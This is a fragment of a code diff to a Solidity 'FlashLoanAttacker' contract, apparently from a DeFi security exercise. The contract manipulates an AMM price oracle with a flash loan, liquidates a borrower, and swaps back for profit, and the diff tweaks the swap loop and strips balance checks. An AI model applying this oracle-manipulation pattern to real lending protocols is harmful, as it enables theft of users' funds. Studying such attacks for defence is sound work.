@@ -58,7 +58,7 @@ contract FlashLoanAttacker is IERC3156FlashBorrower {
         //  uint256 lendQuote = (oracle.lendTokenReserve() * loanInfo.borrowedAmount) / oracle.ethReserve();
 
         // uint256 collateralRequired = (lendQuote * liquidationThreshold) / collateralContext;
-        for (uint256 i = 61 ether; i < 100 ether; i += 1 ether) {
+        for (uint256 i = 50 ether; i < 100 ether; i += 1 ether) {
             //simulate swap lend token for eth
             uint256 lendTokenAmountIn = (originalOracleLendTokenReserve + i) - originalOracleLendTokenReserve;
             console2.log("lendTokenAmountIn:", lendTokenAmountIn);
@@ -92,25 +92,21 @@ contract FlashLoanAttacker is IERC3156FlashBorrower {
         // Step 2.1.1: How many tokens to transfer? (let's try 100 ether first)
 
         // Step 2.2.0: call swapTokensForEth, we give 100 ether for some amount of eth
-        uint256 prevEthBalance = address(this).balance;
+        //uint256 prevEthBalance = address(this).balance;
         uint256 ethAmountIn = amm.swapLendTokenForEth(address(this));
         console2.log("Amount of Eth Received:", ethAmountIn);
         // Step 3.1.0: Now that Price of Token has dropped, we call liquidate(borrower), that should will send
-        uint256 prevTokenBalanceOfAttacker = tokenContract.balanceOf(address(this));
-        //console2.log("prevTokenBalanceOfAttacker:", prevTokenBalanceOfAttacker);
+
         lending.liquidate(borrower);
-        uint256 currentTokenBalanceOfAttacker = tokenContract.balanceOf(address(this));
+        //uint256 currentTokenBalanceOfAttacker = tokenContract.balanceOf(address(this));
         // console2.log("currentTokenBalanceOfAttacker:", currentTokenBalanceOfAttacker);
         // Step 4.1.0: Mission Accomplished right?, swap eth back for tokens.
 
         (bool success,) = address(amm).call{value: address(this).balance}("");
         require(success, "Failed to send ether to amm");
         amm.swapEthForLendToken(address(this));
-        uint256 newTokenBalanceOfAttacker = tokenContract.balanceOf(address(this));
-        //Step 5.1.0: Repay the loan
-        //console2.log("newTokenBalanceOfAttacker:", newTokenBalanceOfAttacker);
-        IERC20(tokenContract).approve(address(amm), type(uint256).max);
 
+        //Step 5.1.0: Repay the loan
         return keccak256("ERC3156FlashBorrower.onFlashLoan");
     }
 
@@ -125,4 +121,3 @@ contract FlashLoanAttacker is IERC3156FlashBorrower {
 // tokens to attacking contract
 // Step 4.1.0: Mission Accomplished right?, swap eth back for tokens.
 // Step 5.1.0: Repay the loan
-//
